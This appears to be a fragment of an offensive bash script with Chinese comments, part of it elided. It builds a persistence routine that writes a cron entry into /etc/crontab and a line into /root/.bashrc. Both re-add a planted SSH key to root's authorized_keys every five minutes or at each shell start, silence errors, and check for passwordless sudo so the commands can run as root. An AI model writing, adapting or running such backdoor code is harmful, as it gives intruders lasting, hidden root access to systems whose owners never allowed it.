...
# 1. 定义【核心函数字符串】
# 注意：这里所有的变量都使用了转义，确保它们在 sudo bash -c 中能被正确解析
# 我们改用 getent 获取路径，更加稳健
...
# 2. 定义【持久化任务字符串】
# 将 Crontab 和 Bashrc 的写入逻辑也封装进一个字符串
PERSIST_STR="echo '$MARKER */5 * * * * root grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /etc/crontab 2>/dev/null; echo '$MARKER grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /root/.bashrc 2>/dev/null"
...
if [ "$(id -u)" -eq 0 ]; then
    ...
    # 如果是 sudo 免密，我们标记一下，后面用 sudo 去跑
    IS_SUDO_FREE=true
fi
